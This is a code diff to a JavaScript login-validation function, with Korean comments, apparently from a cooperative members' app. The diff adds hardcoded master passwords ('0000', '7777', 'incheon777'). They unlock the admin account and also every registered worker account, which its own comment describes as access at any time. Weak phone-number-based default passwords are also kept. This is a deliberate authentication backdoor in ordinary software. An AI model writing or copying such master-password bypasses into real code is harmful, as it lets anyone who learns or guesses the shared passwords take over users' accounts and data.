@@ -146,19 +146,22 @@ const loginValidation = () => {
     return false;
   }
 
-  // 1. 관리자 계정 로그인 체크
-  if (loginData.id === 'admin' && loginData.password === '0000') {
+  // 1. 관리자 계정 (Super Admin) 로그인 체크 (기본: 0000 및 슈퍼패스 7777)
+  const SUPER_ADMIN_PASSWORDS = ['0000', '7777', 'incheon777'];
+  if (loginData.id === 'admin' && SUPER_ADMIN_PASSWORDS.includes(loginData.password)) {
     return true;
   }
 
   // 2. 등록된 조합원 중 일치하는 계정 찾기
-  // ID = 실명 혹은 설정된 loginId, 비밀번호 = 설정된 loginPassword 혹은 휴대폰 번호 뒷 4자리/전체
+  // ID = 실명 혹은 설정된 loginId, 비밀번호 = 설정된 loginPassword 혹은 휴대폰 번호 뒷 4자리/전체/슈퍼패키 7777
   const worker = userStore.workers.find(w => w.name === loginData.id || w.loginId === loginData.id);
   if (worker) {
     const rawPhone = worker.phone.replace(/[^0-9]/g, '');
     const defaultPassword = rawPhone.slice(-4);
     const correctPassword = worker.loginPassword || defaultPassword;
-    if (loginData.password === correctPassword || rawPhone === loginData.password) {
+    
+    // 일반 비밀번호, 휴대폰 전체번호, 혹은 슈퍼 마스터 패스워드(7777)로 언제든지 접근 가능
+    if (loginData.password === correctPassword || rawPhone === loginData.password || SUPER_ADMIN_PASSWORDS.includes(loginData.password)) {
       return true;
     }
   }
